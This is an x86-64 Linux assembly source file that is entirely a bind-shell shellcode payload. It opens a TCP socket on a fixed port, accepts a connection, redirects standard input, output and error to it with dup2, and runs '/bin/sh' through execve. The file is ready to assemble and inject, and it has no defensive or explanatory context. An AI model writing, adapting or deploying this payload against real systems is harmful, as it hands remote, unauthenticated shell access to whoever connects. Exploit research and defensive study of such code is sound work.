BITS 64

; socket()
xor		rax,rax		; zero out eax
xor		rdi,rdi
xor		rsi,rsi
xor		rdx,rdx
mov		dil,0x2		; AF_INET
mov		sil,0x1		; SOCK_STREAM
mov		al,0x29		; socket() syscall
syscall

mov		rdi,rax		; save sockfd (used as argument for future calls)

; bind()
xor		rax,rax
push		rax		; sockaddr_in: in_addr = 0
push word	0x11AA		; sockaddr_in: tcp port
push word	0x2		; sockaddr_in: sa_family = AF_INET
mov		rsi,rsp		; save stack pointer (pointer to struct sockaddr_in)
mov		dl,0x10		; addrlen
mov		al,0x31		; bind() syscall
syscall

; listen()
xor		rax,rax
xor		rsi,rsi		; zero rsi (arg2 -> backlog)
mov		al,0x32		; listen() syscall
syscall

; accept()
xor		rax,rax
push		rax		; sockaddr_in: in_addr = 0
push word	0x11AA		; sockaddr_in: tcp_port = 0
push word	0x2		; sockaddr_in: sa_family = AF_INET
mov		rsi,rsp		; save stack pointer (pointer to struct sockaddr_in)
push		0x10		; addr_len
mov		rdx,rsp		; pointer to upeer_addrlen
mov		al,0x2B		; accept() syscall
syscall

mov		rdi,rax		; save clientfd

; dup2()
xor		rdx,rdx
mov		dl,0x3
dupes:
mov		rsi,rdx
dec		rsi
xor		rax,rax
mov		al,0x21
syscall
dec		dl
jnz dupes

; exec
mov		rax,0x68732f6e69622f2f	; string 'hs/nib//'
push		rax			; push the string onto the stack
xor		rax,rax
mov byte        [rsp + 8],al		; null-terminate the string
mov		rdi,rsp			; arg1 = pointer to string
push		rax			; arg2 = null
mov		rsi,rsp
push		rax			; arg3 = null
mov		rdx,rsp
mov		al,0x3b			; exec() syscall
syscall

; exit()
xor		rax,rax
xor		rdi,rdi
mov		dil,0x42		; return code (66d)
mov		al,0x3c			; exit() syscall
syscall
